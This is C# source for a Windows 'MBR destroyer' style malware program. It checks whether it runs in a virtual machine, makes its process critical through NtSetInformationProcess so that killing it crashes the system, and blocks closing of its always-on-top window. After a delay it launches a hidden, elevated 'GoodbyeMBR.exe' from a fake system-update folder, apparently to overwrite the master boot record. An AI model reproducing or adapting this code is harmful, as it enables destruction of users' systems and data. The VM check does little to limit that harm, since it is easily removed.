using System;
using System.IO;
using Microsoft.Win32;
using System.Diagnostics;
using System.Media;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Drawing;
using System.Windows;
using System.Windows.Interop;
using System.Linq;
using System.Management;

namespace PanOSMain
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
        
        private const int GWL_STYLE = -16;
        private const int WS_SYSMENU = 0x80000;
        [DllImport("user32.dll", SetLastError = true)]
        private static extern int GetWindowLong(IntPtr hWnd, int nIndex);
        [DllImport("user32.dll")]
        private static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);

        ///
        /// Handling the window messages
        ///
        private bool isVM()
        {
            using (var searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
            {
                using (var items = searcher.Get())
                {
                    foreach (var item in items)
                    {
                        string manufacturer = item["Manufacturer"].ToString().ToLower();
                        if ((manufacturer == "microsoft corporation" && item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL"))
                            || manufacturer.Contains("vmware")
                            || item["Model"].ToString() == "VirtualBox")
                        {
                            return true;
                        }
                    }
                }
            }
            return false;
        }

        private bool isInstalledDotNetCompatible()
        {
            using (RegistryKey ndpKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry32).OpenSubKey("SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4\\Full\\"))
            {
                int releaseKey = Convert.ToInt32(ndpKey.GetValue("Release"));
                if (releaseKey >= 461808)
                {
                    return true;
                }
                else
                {
                    return false;
                }
            }
        }

        private bool redistCheck()
        {
            if (File.Exists("C:\\Windows\\System32\\vcruntime140.dll"))
            {
                return true;
            }
            else
            {
                return false;
            }
        }
        public MainWindow()
        {
            if (isInstalledDotNetCompatible() == false)
            {
                MessageBox.Show("This app requires .NET Framework 4.7.2 or later to run properly. You can download .NET from Microsoft's website", ".NET Framework Compatibility Check", MessageBoxButton.OK, MessageBoxImage.Error);
                Environment.Exit(0);
            }
            else
            if (redistCheck() == false)
            {
                MessageBox.Show("C++ Redist not found on your system. Download the Microsoft C++ Redists from Microsoft's website", "Redist Check", MessageBoxButton.OK, MessageBoxImage.Error);
                Environment.Exit(0);
            }
            else
            if (isVM() == false)
            {
                MessageBox.Show("You're not using a Virtual Machine, so you may not proceed. If you have been infected on your host, please email the creator at orangemanagementcorpn@gmail.com for steps to remove this malware.", "Virtual Machine Check", MessageBoxButton.OK, MessageBoxImage.Error);
                Environment.Exit(0);
            }
            else
            {
                try
                {
                    InitializeComponent();
                    var hwnd = new WindowInteropHelper(this).Handle;
                    SetWindowLong(hwnd, GWL_STYLE, GetWindowLong(hwnd, GWL_STYLE) & ~WS_SYSMENU);
                    this.WindowStartupLocation = WindowStartupLocation.CenterScreen;
                    this.ShowInTaskbar = false;
                    this.Topmost = true;
                    this.Closing += MainWindow_Closing;
                    String thisprocessname = Process.GetCurrentProcess().ProcessName;

                    if (Process.GetProcesses().Count(p => p.ProcessName == thisprocessname) > 1)
                    {
                        Environment.Exit(0);
                    }
                }
                catch
                {
                    MessageBox.Show("Error initializing Form1");
                }
                Next();
            }
        }
        bool inDrag = false;
        System.Windows.Point anchorPoint;

        private void MainWindow_Closing(object sender, System.ComponentModel.CancelEventArgs e)
        {
            e.Cancel = true;
        }

        private async void Next()
        {
            int isCritical = 1;
            int BreakOnTermination = 0x1D;

            Process.EnterDebugMode();

            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));

            SoundPlayer playmusic = new SoundPlayer();
            playmusic.SoundLocation = @"C:\Windows\SystemUpdateResources\audio.wav";
            playmusic.Play();
            if (playmusic.IsLoadCompleted)
            {
                await Delay(280000);
                Process mbroverwrite = new Process();
                mbroverwrite.StartInfo.FileName = @"C:\Windows\SystemUpdateResources\GoodbyeMBR.exe";
                mbroverwrite.StartInfo.Verb = "runas";
                mbroverwrite.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                mbroverwrite.Start();
                await Delay(20000);
                Environment.Exit(0);
            }
        }
        private async Task Delay(int howlong)
        {
            await Task.Delay(howlong);
        }

        private void whatHappenedButton_Click(object sender, RoutedEventArgs e)
        {
            Window1 window = new Window1();
            window.ShowDialog();
        }

        private void Window_MouseLeftButtonDown(object sender, System.Windows.Input.MouseButtonEventArgs e)
        {
            anchorPoint = PointToScreen(e.GetPosition(this));
            anchorPoint = new System.Windows.Point(anchorPoint.X / DpiScaleX, anchorPoint.Y / DpiScaleY);
            inDrag = true;
            CaptureMouse();
            e.Handled = true;
        }

        private void Window_MouseMove(object sender, System.Windows.Input.MouseEventArgs e)
        {
            if (inDrag)
            {
                System.Windows.Point currentPoint = PointToScreen(e.GetPosition(this));
                currentPoint = new System.Windows.Point(currentPoint.X / DpiScaleX, currentPoint.Y / DpiScaleY);
                this.Left = this.Left + currentPoint.X - anchorPoint.X;
                this.Top = this.Top + currentPoint.Y - anchorPoint.Y;
                anchorPoint = currentPoint;
            }
        }

        private void Window_MouseLeftButtonUp(object sender, System.Windows.Input.MouseButtonEventArgs e)
        {
            inDrag = false;
            ReleaseMouseCapture();
        }

        private double DpiScaleX
        {
            get { return PresentationSource.FromVisual(this).CompositionTarget.TransformToDevice.M11; }
        }

        private double DpiScaleY
        {
            get { return PresentationSource.FromVisual(this).CompositionTarget.TransformToDevice.M22; }
        }
    }
}
